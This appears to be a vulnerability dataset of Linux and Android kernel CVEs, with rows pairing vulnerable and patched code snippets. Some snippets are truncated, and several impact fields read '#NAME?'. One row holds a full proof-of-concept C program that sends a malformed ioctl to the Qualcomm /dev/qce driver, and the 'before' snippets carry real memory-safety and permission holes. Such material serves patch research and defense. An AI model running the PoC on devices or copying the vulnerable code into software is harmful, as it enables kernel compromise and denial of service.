2017,#NAME?,CVE-2017-0585,,
2017,#NAME?,CVE-2017-0584,,
2017,Exec Code ,CVE-2017-0583,,
2017,Exec Code ,CVE-2017-0582,,
2017,Exec Code ,CVE-2017-0581,,
2017,Exec Code ,CVE-2017-0580,,
2017,Exec Code ,CVE-2017-0579,,
2017,Exec Code ,CVE-2017-0577,,
2017,Exec Code ,CVE-2017-0576,"































































































































































","#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <limits.h>
#include <inttypes.h>


/*
 * PoC By Scott Bauer
 * Bug found by derrek
 */


static const char *dev = ""/dev/qce"";

#define QCEDEV_MAX_KEY_SIZE 64
#define QCEDEV_MAX_IV_SIZE 32
#define QCEDEV_MAX_BUFFERS 16


struct  buf_info {
 union {
 uint32_t        offset;
 uint8_t         *vaddr;
        };
 uint32_t        len;
};
struct  qcedev_vbuf_info {
 struct buf_info src[QCEDEV_MAX_BUFFERS];
 struct buf_info dst[QCEDEV_MAX_BUFFERS];
};

struct  qcedev_pmem_info {
 int             fd_src;
 struct buf_info src[QCEDEV_MAX_BUFFERS];
 int             fd_dst;
 struct buf_info dst[QCEDEV_MAX_BUFFERS];
};

enum qcedev_oper_enum {
        QCEDEV_OPER_DEC         = 0,
        QCEDEV_OPER_ENC         = 1,
        QCEDEV_OPER_DEC_NO_KEY  = 2,
        QCEDEV_OPER_ENC_NO_KEY  = 3,
        QCEDEV_OPER_LAST
};

enum qcedev_cipher_alg_enum {
        QCEDEV_ALG_DES          = 0,
        QCEDEV_ALG_3DES         = 1,
        QCEDEV_ALG_AES          = 2,
        QCEDEV_ALG_LAST
};

enum qcedev_cipher_mode_enum {
        QCEDEV_AES_MODE_CBC     = 0,
        QCEDEV_AES_MODE_ECB     = 1,
        QCEDEV_AES_MODE_CTR     = 2,
        QCEDEV_AES_MODE_XTS     = 3,
        QCEDEV_AES_MODE_CCM     = 4,
        QCEDEV_DES_MODE_CBC     = 5,
        QCEDEV_DES_MODE_ECB     = 6,
        QCEDEV_AES_DES_MODE_LAST
};

struct  qcedev_cipher_op_req {
 uint8_t                         use_pmem;
 union {
 struct qcedev_pmem_info pmem;
 struct qcedev_vbuf_info vbuf;
        };
 uint32_t                        entries;
 uint32_t                        data_len;
 uint8_t                         in_place_op;
 uint8_t                         enckey[QCEDEV_MAX_KEY_SIZE];
 uint32_t                        encklen;
 uint8_t                         iv[QCEDEV_MAX_IV_SIZE];
 uint32_t                        ivlen;
 uint32_t                        byteoffset;
 enum qcedev_cipher_alg_enum     alg;
 enum qcedev_cipher_mode_enum    mode;
 enum qcedev_oper_enum           op;
};

#define QCEDEV_IOC_MAGIC 0x87

#define QCEDEV_IOCTL_ENC_REQ            \
 _IOWR(QCEDEV_IOC_MAGIC, 1, struct qcedev_cipher_op_req)
#define QCEDEV_IOCTL_DEC_REQ            \
 _IOWR(QCEDEV_IOC_MAGIC, 2, struct qcedev_cipher_op_req)



void thread_func(unsigned int start, unsigned int end, int fd)
{
 struct qcedev_cipher_op_req req = { 0 };
 unsigned int i;
 char *data;

	data = mmap(NULL, 0xFFFFFF * 3, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
 if (data == MAP_FAILED) {
 printf(""mmap failed, get a better phone\n"");
 exit(0);
	}
 for (i = 0; i < 0xFFFFFF * 3; i += sizeof(void*))
		*((unsigned long *)(data + i)) = 0xABADACC355001337;


	req.in_place_op = 1;
 /* setup the parameters to pass a few sanity checks */
	req.entries = 2;
	req.byteoffset = 15;
	req.mode = QCEDEV_AES_MODE_CTR;

	req.op = QCEDEV_OPER_ENC;//_NO_KEY;
	req.ivlen = 1;
	req.data_len = 0xFFFFFFFE;
	req.vbuf.src[0].len = 4;
	req.vbuf.src[1].len = 0xFFFFFFFE - 4;
	req.vbuf.src[0].vaddr = (uint8_t*)data;
	req.vbuf.src[1].vaddr = (uint8_t*)data;
	req.vbuf.dst[0].len = 4;
	req.vbuf.dst[1].len = 0xFFFFFFFE - 4;
	req.vbuf.dst[0].vaddr = (uint8_t*)data;
	req.vbuf.dst[1].vaddr = (uint8_t*)data;


 ioctl(fd, QCEDEV_IOCTL_ENC_REQ, &req);

 printf(""exiting\n"");
 exit(0);
}

int main(void)
{
 int fd;
 unsigned int i;
 unsigned int start = 0;
 unsigned int _gap = ~0;
 unsigned int gap = _gap / 8;
 struct qcedev_cipher_op_req req = { 0 };
 //char data[32] = { A };
 char *data;
	fd = open(dev, O_RDWR);
 if (fd < 0) {
 printf(""Failed to open %s with errno %s\n"", dev,
 strerror(errno));
 return EXIT_FAILURE;

	}
 thread_func(start, start + gap, fd);

 sleep(1000000);
 return EXIT_FAILURE;
}
"
2017,Exec Code ,CVE-2017-0575,,
2017,Exec Code ,CVE-2017-0574,,
2017,Exec Code ,CVE-2017-0573,,
2017,Exec Code ,CVE-2017-0572,,
2017,Exec Code ,CVE-2017-0571,,
2017,Exec Code ,CVE-2017-0570,,
2017,Exec Code ,CVE-2017-0569,,
2017,Exec Code ,CVE-2017-0568,,
2017,Exec Code ,CVE-2017-0567,,
2017,Exec Code ,CVE-2017-0564,,
2017,Exec Code ,CVE-2017-0563,,
2017,Exec Code ,CVE-2017-0561,,
2017,#NAME?,CVE-2017-0537,,
2017,#NAME?,CVE-2017-0536,,
2017,#NAME?,CVE-2017-0535,,
2017,#NAME?,CVE-2017-0534,,
2017,#NAME?,CVE-2017-0533,,
2017,#NAME?,CVE-2017-0531,,
2017,Exec Code Bypass ,CVE-2017-0528,,
2017,Exec Code ,CVE-2017-0527,,
2017,Exec Code ,CVE-2017-0526,,
2017,Exec Code ,CVE-2017-0525,,
2017,Exec Code ,CVE-2017-0524,,
2017,Exec Code ,CVE-2017-0523,,
2017,Exec Code ,CVE-2017-0521,,
2017,Exec Code ,CVE-2017-0520,,
2017,Exec Code ,CVE-2017-0519,,
2017,Exec Code ,CVE-2017-0518,,
2017,Exec Code ,CVE-2017-0516,,
2017,Exec Code ,CVE-2017-0510,,
2017,Exec Code ,CVE-2017-0508,,
2017,Exec Code ,CVE-2017-0507,,
2017,Exec Code ,CVE-2017-0465,,
2017,Exec Code ,CVE-2017-0464,,
2017,Exec Code ,CVE-2017-0463,,
2017,Exec Code ,CVE-2017-0462,,
2017,#NAME?,CVE-2017-0461,,
2017,Exec Code ,CVE-2017-0460,,
2017,#NAME?,CVE-2017-0459,,
2017,Exec Code ,CVE-2017-0458,,
2017,Exec Code ,CVE-2017-0457,,
2017,Exec Code ,CVE-2017-0456,,
2017,Exec Code Bypass +Info ,CVE-2017-0455,,
2017,Exec Code ,CVE-2017-0454,,
2017,Exec Code ,CVE-2017-0453,,
2017,#NAME?,CVE-2017-0452,,
2017,#NAME?,CVE-2017-0451,,
2017,Exec Code ,CVE-2017-0449,,
2017,#NAME?,CVE-2017-0448,,
2017,Exec Code ,CVE-2017-0447,,
2017,Exec Code ,CVE-2017-0446,,
2017,Exec Code ,CVE-2017-0445,,
2017,Exec Code ,CVE-2017-0444,,
2017,Exec Code ,CVE-2017-0443,,
2017,Exec Code ,CVE-2017-0442,,
2017,Exec Code ,CVE-2017-0441,,
2017,Exec Code ,CVE-2017-0440,,
2017,Exec Code ,CVE-2017-0439,,
2017,Exec Code ,CVE-2017-0438,,
2017,Exec Code ,CVE-2017-0437,,
2017,Exec Code ,CVE-2017-0436,,
2017,Exec Code ,CVE-2017-0435,,
2017,Exec Code ,CVE-2017-0434,,
2017,Exec Code ,CVE-2017-0433,,
2017,Exec Code ,CVE-2017-0432,,
2017,Exec Code ,CVE-2017-0430,,
2017,Exec Code ,CVE-2017-0429,,
2017,Exec Code ,CVE-2017-0428,,
2017,Exec Code ,CVE-2017-0427,,
2017,Exec Code ,CVE-2017-0404,,
2017,Exec Code ,CVE-2017-0403,,
2017,Exec Code ,CVE-2017-0339,,
2017,Exec Code ,CVE-2017-0338,,
2017,Exec Code ,CVE-2017-0337,,
2017,#NAME?,CVE-2017-0336,,
2017,Exec Code ,CVE-2017-0335,,
2017,#NAME?,CVE-2017-0334,,
2017,Exec Code ,CVE-2017-0333,,
2017,Exec Code ,CVE-2017-0332,,
2017,Exec Code ,CVE-2017-0331,,
2017,#NAME?,CVE-2017-0330,,
2017,Exec Code ,CVE-2017-0329,,
2017,#NAME?,CVE-2017-0328,,
2017,Exec Code ,CVE-2017-0327,,
2017,Exec Code ,CVE-2017-0325,,
2017,Exec Code ,CVE-2017-0307,,
2017,Exec Code ,CVE-2017-0306,,
2019,,CVE-2016-10907,,
2019,,CVE-2016-10906,,
2019,,CVE-2016-10905,,
2019,Overflow ,CVE-2016-10764," goto err;
		}

 if (cs > CQSPI_MAX_CHIPSELECT) {
 dev_err(dev, ""Chip select %d out of range.\n"", cs);
 goto err;
		}
"," goto err;
		}

 if (cs >= CQSPI_MAX_CHIPSELECT) {
 dev_err(dev, ""Chip select %d out of range.\n"", cs);
 goto err;
		}
"
2019,DoS ,CVE-2016-10741," if (error)
 goto out_unlock;





















 /* for DAX, we convert unwritten extents directly */
 if (create &&
	    (!nimaps ||
	     (new || ISUNWRITTEN(&imap))))
 set_buffer_new(bh_result);

 BUG_ON(direct && imap.br_startblock == DELAYSTARTBLOCK);

 return 0;

out_unlock:
"," if (error)
 goto out_unlock;

 /*
	 * The only time we can ever safely find delalloc blocks on direct I/O
	 * is a dio write to post-eof speculative preallocation. All other
	 * scenarios are indicative of a problem or misuse (such as mixing
	 * direct and mapped I/O).
	 *
	 * The file may be unmapped by the time we get here so we cannot
	 * reliably fail the I/O based on mapping. Instead, fail the I/O if this
	 * is a read or a write within eof. Otherwise, carry on but warn as a
	 * precuation if the file happens to be mapped.
 */
 if (direct && imap.br_startblock == DELAYSTARTBLOCK) {
 if (!create || offset < i_size_read(VFS_I(ip))) {
 WARN_ON_ONCE(1);
			error = -EIO;
 goto out_unlock;
		}
 WARN_ON_ONCE(mapping_mapped(VFS_I(ip)->i_mapping));
	}

 /* for DAX, we convert unwritten extents directly */
 if (create &&
	    (!nimaps ||
	     (new || ISUNWRITTEN(&imap))))
 set_buffer_new(bh_result);



 return 0;

out_unlock:
"
2018,,CVE-2016-10723,,
2017,DoS ,CVE-2016-10318,"int fscrypt_process_policy(struct inode *inode,
 const struct fscrypt_policy *policy)
{



 if (policy->version != 0)
 return -EINVAL;

","int fscrypt_process_policy(struct inode *inode,
 const struct fscrypt_policy *policy)
{
 if (!inode_owner_or_capable(inode))
 return -EACCES;

 if (policy->version != 0)
 return -EINVAL;

"
2017,#NAME?,CVE-2016-10296,,
2017,#NAME?,CVE-2016-10295,,
2017,#NAME?,CVE-2016-10294,,
2017,#NAME?,CVE-2016-10293,,
2017,DoS ,CVE-2016-10292,,
2017,Exec Code ,CVE-2016-10291,,
2017,Exec Code ,CVE-2016-10290,,
2017,Exec Code ,CVE-2016-10289,,
2017,Exec Code ,CVE-2016-10288,,
2017,Exec Code ,CVE-2016-10287,,
2017,Exec Code ,CVE-2016-10286,,
2017,Exec Code ,CVE-2016-10285,,
2017,Exec Code ,CVE-2016-10284,,
2017,Exec Code ,CVE-2016-10283,,
2017,Exec Code ,CVE-2016-10277,,
2017,Exec Code ,CVE-2016-10229," int peeked, off = 0;
 int err;
 int is_udplite = IS_UDPLITE(sk);

 bool slow;

 if (flags & MSG_ERRQUEUE)
 */

 if (copied < ulen || UDP_SKB_CB(skb)->partial_cov) {
 if (udp_lib_checksum_complete(skb))

 goto csum_copy_err;
	}

 if (skb_csum_unnecessary(skb))
		err = skb_copy_datagram_msg(skb, sizeof(struct udphdr),
					    msg, copied);
 else {
 int peeked, off = 0;
 int err;
 int is_udplite = IS_UDPLITE(sk);

 int is_udp4;
 bool slow;

 */

 if (copied < ulen || UDP_SKB_CB(skb)->partial_cov) {
 if (udp_lib_checksum_complete(skb))

 goto csum_copy_err;
	}

 if (skb_csum_unnecessary(skb))
		err = skb_copy_datagram_msg(skb, sizeof(struct udphdr),
					    msg, copied);
 else {
"," int peeked, off = 0;
 int err;
 int is_udplite = IS_UDPLITE(sk);
 bool checksum_valid = false;
 bool slow;

 if (flags & MSG_ERRQUEUE)
 */

 if (copied < ulen || UDP_SKB_CB(skb)->partial_cov) {
		checksum_valid = !udp_lib_checksum_complete(skb);
 if (!checksum_valid)
 goto csum_copy_err;
	}

 if (checksum_valid || skb_csum_unnecessary(skb))
		err = skb_copy_datagram_msg(skb, sizeof(struct udphdr),
					    msg, copied);
 else {
 int peeked, off = 0;
 int err;
 int is_udplite = IS_UDPLITE(sk);
 bool checksum_valid = false;
 int is_udp4;
 bool slow;

 */

 if (copied < ulen || UDP_SKB_CB(skb)->partial_cov) {
		checksum_valid = !udp_lib_checksum_complete(skb);
 if (!checksum_valid)
 goto csum_copy_err;
	}

 if (checksum_valid || skb_csum_unnecessary(skb))
		err = skb_copy_datagram_msg(skb, sizeof(struct udphdr),
					    msg, copied);
 else {
"
2017,DoS ,CVE-2016-10208,"			(EXT4_MAX_BLOCK_FILE_PHYS / EXT4_BLOCKS_PER_GROUP(sb)));
	db_count = (sbi->s_groups_count + EXT4_DESC_PER_BLOCK(sb) - 1) /
 EXT4_DESC_PER_BLOCK(sb);









	sbi->s_group_desc = ext4_kvmalloc(db_count *
 sizeof(struct buffer_head *),
					  GFP_KERNEL);
","			(EXT4_MAX_BLOCK_FILE_PHYS / EXT4_BLOCKS_PER_GROUP(sb)));
	db_count = (sbi->s_groups_count + EXT4_DESC_PER_BLOCK(sb) - 1) /
 EXT4_DESC_PER_BLOCK(sb);
 if (ext4_has_feature_meta_bg(sb)) {
 if (le32_to_cpu(es->s_first_meta_bg) >= db_count) {
 ext4_msg(sb, KERN_WARNING,
 ""first meta block group too large: %u ""
 ""(group descriptor block count %u)"",
 le32_to_cpu(es->s_first_meta_bg), db_count);
 goto failed_mount;
		}
	}
	sbi->s_group_desc = ext4_kvmalloc(db_count *
 sizeof(struct buffer_head *),
					  GFP_KERNEL);
"
2017,DoS +Priv ,CVE-2016-10200," int ret;
 int chk_addr_ret;

 if (!sock_flag(sk, SOCK_ZAPPED))
 return -EINVAL;
 if (addr_len < sizeof(struct sockaddr_l2tpip))
 return -EINVAL;
 if (addr->l2tp_family != AF_INET)
 read_unlock_bh(&l2tp_ip_lock);

 lock_sock(sk);



 if (sk->sk_state != TCP_CLOSE || addr_len < sizeof(struct sockaddr_l2tpip))
 goto out;

 int addr_type;
 int err;

 if (!sock_flag(sk, SOCK_ZAPPED))
 return -EINVAL;
 if (addr->l2tp_family != AF_INET6)
 return -EINVAL;
 if (addr_len < sizeof(*addr))
 lock_sock(sk);

	err = -EINVAL;



 if (sk->sk_state != TCP_CLOSE)
 goto out_unlock;

"," int ret;
 int chk_addr_ret;



 if (addr_len < sizeof(struct sockaddr_l2tpip))
 return -EINVAL;
 if (addr->l2tp_family != AF_INET)
 read_unlock_bh(&l2tp_ip_lock);

 lock_sock(sk);
 if (!sock_flag(sk, SOCK_ZAPPED))
 goto out;

 if (sk->sk_state != TCP_CLOSE || addr_len < sizeof(struct sockaddr_l2tpip))
 goto out;

 int addr_type;
 int err;



 if (addr->l2tp_family != AF_INET6)
 return -EINVAL;
 if (addr_len < sizeof(*addr))
 lock_sock(sk);

	err = -EINVAL;
 if (!sock_flag(sk, SOCK_ZAPPED))
 goto out_unlock;

 if (sk->sk_state != TCP_CLOSE)
 goto out_unlock;

"
2017,DoS Overflow Mem. Corr. ,CVE-2016-10154,"   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/

#include <crypto/skcipher.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/fs.h>
static int
smbhash(unsigned char *out, const unsigned char *in, unsigned char *key)
{
 int rc;
 unsigned char key2[8];
 struct crypto_skcipher *tfm_des;
 struct scatterlist sgin, sgout;
 struct skcipher_request *req;

 str_to_key(key, key2);

	tfm_des = crypto_alloc_skcipher(""ecb(des)"", 0, CRYPTO_ALG_ASYNC);
 if (IS_ERR(tfm_des)) {
		rc = PTR_ERR(tfm_des);
 cifs_dbg(VFS, ""could not allocate des crypto API\n"");
 goto smbhash_err;
	}

	req = skcipher_request_alloc(tfm_des, GFP_KERNEL);
 if (!req) {
		rc = -ENOMEM;
 cifs_dbg(VFS, ""could not allocate des crypto API\n"");
 goto smbhash_free_skcipher;
	}

 crypto_skcipher_setkey(tfm_des, key2, 8);

 sg_init_one(&sgin, in, 8);
 sg_init_one(&sgout, out, 8);

 skcipher_request_set_callback(req, 0, NULL, NULL);
 skcipher_request_set_crypt(req, &sgin, &sgout, 8, NULL);

	rc = crypto_skcipher_encrypt(req);
 if (rc)
 cifs_dbg(VFS, ""could not encrypt crypt key rc: %d\n"", rc);

 skcipher_request_free(req);

smbhash_free_skcipher:
 crypto_free_skcipher(tfm_des);
smbhash_err:
 return rc;
}

static int
","   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/

#include <linux/crypto.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/fs.h>
static int
smbhash(unsigned char *out, const unsigned char *in, unsigned char *key)
{

 unsigned char key2[8];
 struct crypto_cipher *tfm_des;



 str_to_key(key, key2);

	tfm_des = crypto_alloc_cipher(""des"", 0, 0);
 if (IS_ERR(tfm_des)) {








 cifs_dbg(VFS, ""could not allocate des crypto API\n"");
 return PTR_ERR(tfm_des);
	}

 crypto_cipher_setkey(tfm_des, key2, 8);
 crypto_cipher_encrypt_one(tfm_des, out, in);
 crypto_free_cipher(tfm_des);


 return 0;












}

static int
"
2017,DoS Mem. Corr. ,CVE-2016-10153,"	}
}
























































































static int ceph_key_preparse(struct key_preparsed_payload *prep)
{
 struct ceph_crypto_key *ckey;
 void *dst, size_t *dst_len,
 const void *src1, size_t src1_len,
 const void *src2, size_t src2_len);


int ceph_crypto_init(void);
void ceph_crypto_shutdown(void);

","	}
}

static int ceph_aes_crypt(const struct ceph_crypto_key *key, bool encrypt,
 void *buf, int buf_len, int in_len, int *pout_len)
{
 struct crypto_skcipher *tfm = ceph_crypto_alloc_cipher();
 SKCIPHER_REQUEST_ON_STACK(req, tfm);
 struct sg_table sgt;
 struct scatterlist prealloc_sg;
 char iv[AES_BLOCK_SIZE];
 int pad_byte = AES_BLOCK_SIZE - (in_len & (AES_BLOCK_SIZE - 1));
 int crypt_len = encrypt ? in_len + pad_byte : in_len;
 int ret;

 if (IS_ERR(tfm))
 return PTR_ERR(tfm);

 WARN_ON(crypt_len > buf_len);
 if (encrypt)
 memset(buf + in_len, pad_byte, pad_byte);
	ret = setup_sgtable(&sgt, &prealloc_sg, buf, crypt_len);
 if (ret)
 goto out_tfm;

 crypto_skcipher_setkey((void *)tfm, key->key, key->len);
 memcpy(iv, aes_iv, AES_BLOCK_SIZE);

 skcipher_request_set_tfm(req, tfm);
 skcipher_request_set_callback(req, 0, NULL, NULL);
 skcipher_request_set_crypt(req, sgt.sgl, sgt.sgl, crypt_len, iv);

 /*
	print_hex_dump(KERN_ERR, ""key: "", DUMP_PREFIX_NONE, 16, 1,
		       key->key, key->len, 1);
	print_hex_dump(KERN_ERR, "" in: "", DUMP_PREFIX_NONE, 16, 1,
		       buf, crypt_len, 1);
 */
 if (encrypt)
		ret = crypto_skcipher_encrypt(req);
 else
		ret = crypto_skcipher_decrypt(req);
 skcipher_request_zero(req);
 if (ret) {
 pr_err(""%s %scrypt failed: %d\n"", __func__,
 encrypt ? ""en"" : ""de"", ret);
 goto out_sgt;
	}
 /*
	print_hex_dump(KERN_ERR, ""out: "", DUMP_PREFIX_NONE, 16, 1,
		       buf, crypt_len, 1);
 */

 if (encrypt) {
		*pout_len = crypt_len;
	} else {
		pad_byte = *(char *)(buf + in_len - 1);
 if (pad_byte > 0 && pad_byte <= AES_BLOCK_SIZE &&
		    in_len >= pad_byte) {
			*pout_len = in_len - pad_byte;
		} else {
 pr_err(""%s got bad padding %d on in_len %d\n"",
			       __func__, pad_byte, in_len);
			ret = -EPERM;
 goto out_sgt;
		}
	}

out_sgt:
 teardown_sgtable(&sgt);
out_tfm:
 crypto_free_skcipher(tfm);
 return ret;
}

int ceph_crypt(const struct ceph_crypto_key *key, bool encrypt,
 void *buf, int buf_len, int in_len, int *pout_len)
{
 switch (key->type) {
 case CEPH_CRYPTO_NONE:
		*pout_len = in_len;
 return 0;
 case CEPH_CRYPTO_AES:
 return ceph_aes_crypt(key, encrypt, buf, buf_len, in_len,
				      pout_len);
 default:
 return -ENOTSUPP;
	}
}

static int ceph_key_preparse(struct key_preparsed_payload *prep)
{
 struct ceph_crypto_key *ckey;
 void *dst, size_t *dst_len,
 const void *src1, size_t src1_len,
 const void *src2, size_t src2_len);
int ceph_crypt(const struct ceph_crypto_key *key, bool encrypt,
 void *buf, int buf_len, int in_len, int *pout_len);
int ceph_crypto_init(void);
void ceph_crypto_shutdown(void);

"
2017,DoS +Priv ,CVE-2016-10150,"
	ret = anon_inode_getfd(ops->name, &kvm_device_fops, dev, O_RDWR | O_CLOEXEC);
 if (ret < 0) {
		ops->destroy(dev);
 mutex_lock(&kvm->lock);
 list_del(&dev->vm_node);
 mutex_unlock(&kvm->lock);

 return ret;
	}

","
	ret = anon_inode_getfd(ops->name, &kvm_device_fops, dev, O_RDWR | O_CLOEXEC);
 if (ret < 0) {

 mutex_lock(&kvm->lock);
 list_del(&dev->vm_node);
 mutex_unlock(&kvm->lock);
		ops->destroy(dev);
 return ret;
	}

"
2017,DoS ,CVE-2016-10147," goto out;
}

static inline void mcryptd_check_internal(struct rtattr **tb, u32 *type,
					  u32 *mask)
{
 struct crypto_attr_type *algt;

	algt = crypto_get_attr_type(tb);
 if (IS_ERR(algt))
 return;
 if ((algt->type & CRYPTO_ALG_INTERNAL))
		*type |= CRYPTO_ALG_INTERNAL;
 if ((algt->mask & CRYPTO_ALG_INTERNAL))
		*mask |= CRYPTO_ALG_INTERNAL;




}

static int mcryptd_hash_init_tfm(struct crypto_tfm *tfm)
	u32 mask = 0;
 int err;

 mcryptd_check_internal(tb, &type, &mask);


	halg = ahash_attr_alg(tb[1], type, mask);
 if (IS_ERR(halg))
"," goto out;
}

static inline bool mcryptd_check_internal(struct rtattr **tb, u32 *type,
					  u32 *mask)
{
 struct crypto_attr_type *algt;

	algt = crypto_get_attr_type(tb);
 if (IS_ERR(algt))
 return false;

	*type |= algt->type & CRYPTO_ALG_INTERNAL;
	*mask |= algt->mask & CRYPTO_ALG_INTERNAL;

 if (*type & *mask & CRYPTO_ALG_INTERNAL)
 return true;
 else
 return false;
}

static int mcryptd_hash_init_tfm(struct crypto_tfm *tfm)
	u32 mask = 0;
 int err;

 if (!mcryptd_check_internal(tb, &type, &mask))
 return -EINVAL;

	halg = ahash_attr_alg(tb[1], type, mask);
 if (IS_ERR(halg))
"
2016,DoS ,CVE-2016-10088,"
 dprintk(""%s: write %Zd bytes\n"", bd->name, count);




 bsg_set_block(bd, file);

	bytes_written = 0;
 sg_io_hdr_t *hp;
 unsigned char cmnd[SG_MAX_CDB_SIZE];




 if ((!(sfp = (Sg_fd *) filp->private_data)) || (!(sdp = sfp->parentdp)))
 return -ENXIO;
 SCSI_LOG_TIMEOUT(3, sg_printk(KERN_INFO, sdp,
","
 dprintk(""%s: write %Zd bytes\n"", bd->name, count);

 if (unlikely(segment_eq(get_fs(), KERNEL_DS)))
 return -EINVAL;

 bsg_set_block(bd, file);

	bytes_written = 0;
 sg_io_hdr_t *hp;
 unsigned char cmnd[SG_MAX_CDB_SIZE];

 if (unlikely(segment_eq(get_fs(), KERNEL_DS)))
 return -EINVAL;

 if ((!(sfp = (Sg_fd *) filp->private_data)) || (!(sdp = sfp->parentdp)))
 return -ENXIO;
 SCSI_LOG_TIMEOUT(3, sg_printk(KERN_INFO, sdp,
"
2017,#NAME?,CVE-2016-10044," static const struct dentry_operations ops = {
		.d_dname	= simple_dname,
	};
 return mount_pseudo(fs_type, ""aio:"", NULL, &ops, AIO_RING_MAGIC);





}

/* aio_setup
"," static const struct dentry_operations ops = {
		.d_dname	= simple_dname,
	};
 struct dentry *root = mount_pseudo(fs_type, ""aio:"", NULL, &ops,
					   AIO_RING_MAGIC);

 if (!IS_ERR(root))
		root->d_sb->s_iflags |= SB_I_NOEXEC;
 return root;
}

/* aio_setup
"
2016,DoS ,CVE-2016-9919,"
 if (__ipv6_addr_needs_scope_id(addr_type))
		iif = skb->dev->ifindex;
 else
		iif = l3mdev_master_ifindex(skb_dst(skb)->dev);



 /*
	 *	Must not send error if the source does not uniquely
","
 if (__ipv6_addr_needs_scope_id(addr_type))
		iif = skb->dev->ifindex;
 else {
		dst = skb_dst(skb);
		iif = l3mdev_master_ifindex(dst ? dst->dev : skb->dev);
	}

 /*
	 *	Must not send error if the source does not uniquely
"
2016,DoS ,CVE-2016-9806," struct netlink_callback *cb;
 struct sk_buff *skb = NULL;
 struct nlmsghdr *nlh;

 int len, err = -ENOBUFS;
 int alloc_min_size;
 int alloc_size;
		cb->done(cb);

	nlk->cb_running = false;


 mutex_unlock(nlk->cb_mutex);
 module_put(cb->module);
 consume_skb(cb->skb);
 return 0;

errout_skb:
"," struct netlink_callback *cb;
 struct sk_buff *skb = NULL;
 struct nlmsghdr *nlh;
 struct module *module;
 int len, err = -ENOBUFS;
 int alloc_min_size;
 int alloc_size;
		cb->done(cb);

	nlk->cb_running = false;
	module = cb->module;
	skb = cb->skb;
 mutex_unlock(nlk->cb_mutex);
 module_put(module);
 consume_skb(skb);
 return 0;

errout_skb:
"
2016,DoS ,CVE-2016-9794," snd_timer_interrupt(substream->timer, 1);
#endif
 _end:
 snd_pcm_stream_unlock_irqrestore(substream, flags);
 kill_fasync(&runtime->fasync, SIGIO, POLL_IN);

}

EXPORT_SYMBOL(snd_pcm_period_elapsed);
"," snd_timer_interrupt(substream->timer, 1);
#endif
 _end:

 kill_fasync(&runtime->fasync, SIGIO, POLL_IN);
 snd_pcm_stream_unlock_irqrestore(substream, flags);
}

EXPORT_SYMBOL(snd_pcm_period_elapsed);
"
2016,DoS Overflow Mem. Corr. ,CVE-2016-9793,"		val = min_t(u32, val, sysctl_wmem_max);
set_sndbuf:
		sk->sk_userlocks |= SOCK_SNDBUF_LOCK;
		sk->sk_sndbuf = max_t(u32, val * 2, SOCK_MIN_SNDBUF);
 /* Wake up sending tasks if we upped the value. */
		sk->sk_write_space(sk);
 break;
		 * returning the value we actually used in getsockopt
		 * is the most desirable behavior.
 */
		sk->sk_rcvbuf = max_t(u32, val * 2, SOCK_MIN_RCVBUF);
 break;

 case SO_RCVBUFFORCE:
","		val = min_t(u32, val, sysctl_wmem_max);
set_sndbuf:
		sk->sk_userlocks |= SOCK_SNDBUF_LOCK;
		sk->sk_sndbuf = max_t(int, val * 2, SOCK_MIN_SNDBUF);
 /* Wake up sending tasks if we upped the value. */
		sk->sk_write_space(sk);
 break;
		 * returning the value we actually used in getsockopt
		 * is the most desirable behavior.
 */
		sk->sk_rcvbuf = max_t(int, val * 2, SOCK_MIN_RCVBUF);
 break;

 case SO_RCVBUFFORCE:
"
2016,DoS +Priv ,CVE-2016-9777,"static void rtc_irq_eoi_tracking_reset(struct kvm_ioapic *ioapic)
{
	ioapic->rtc_status.pending_eoi = 0;
 bitmap_zero(ioapic->rtc_status.dest_map.map, KVM_MAX_VCPUS);
}

static void kvm_rtc_eoi_tracking_restore_all(struct kvm_ioapic *ioapic);

struct dest_map {
 /* vcpu bitmap where IRQ has been sent */
 DECLARE_BITMAP(map, KVM_MAX_VCPUS);

 /*
	 * Vector sent to a given vcpu, only valid when
	 * the vcpu's bit in map is set
 */
	u8 vectors[KVM_MAX_VCPUS];
};


","static void rtc_irq_eoi_tracking_reset(struct kvm_ioapic *ioapic)
{
	ioapic->rtc_status.pending_eoi = 0;
 bitmap_zero(ioapic->rtc_status.dest_map.map, KVM_MAX_VCPU_ID);
}

static void kvm_rtc_eoi_tracking_restore_all(struct kvm_ioapic *ioapic);

struct dest_map {
 /* vcpu bitmap where IRQ has been sent */
 DECLARE_BITMAP(map, KVM_MAX_VCPU_ID);

 /*
	 * Vector sent to a given vcpu, only valid when
	 * the vcpu's bit in map is set
 */
	u8 vectors[KVM_MAX_VCPU_ID];
};


"
2016,#NAME?,CVE-2016-9756,"static int em_jmp_far(struct x86_emulate_ctxt *ctxt)
{
	int rc;
	unsigned short sel, old_sel;
	struct desc_struct old_desc, new_desc;
	const struct x86_emulate_ops *ops = ctxt->ops;
	u8 cpl = ctxt->ops->cpl(ctxt);

	/* Assignment of RIP may only fail in 64-bit mode */
	if (ctxt->mode == X86EMUL_MODE_PROT64)
		ops->get_segment(ctxt, &old_sel, &old_desc, NULL,
				 VCPU_SREG_CS);

	memcpy(&sel, ctxt->src.valptr + ctxt->op_bytes, 2);

	rc = __load_segment_descriptor(ctxt, sel, VCPU_SREG_CS, cpl,
		return rc;

	rc = assign_eip_far(ctxt, ctxt->src.val, &new_desc);
	if (rc != X86EMUL_CONTINUE) {
		WARN_ON(ctxt->mode != X86EMUL_MODE_PROT64);
		/* assigning eip failed; restore the old cs */
		ops->set_segment(ctxt, old_sel, &old_desc, 0, VCPU_SREG_CS);
		return rc;
	}
	return rc;
}

{
	int rc;
	unsigned long eip, cs;
	u16 old_cs;
	int cpl = ctxt->ops->cpl(ctxt);
	struct desc_struct old_desc, new_desc;
	const struct x86_emulate_ops *ops = ctxt->ops;

	if (ctxt->mode == X86EMUL_MODE_PROT64)
		ops->get_segment(ctxt, &old_cs, &old_desc, NULL,
				 VCPU_SREG_CS);

	rc = emulate_pop(ctxt, &eip, ctxt->op_bytes);
	if (rc != X86EMUL_CONTINUE)
	if (rc != X86EMUL_CONTINUE)
		return rc;
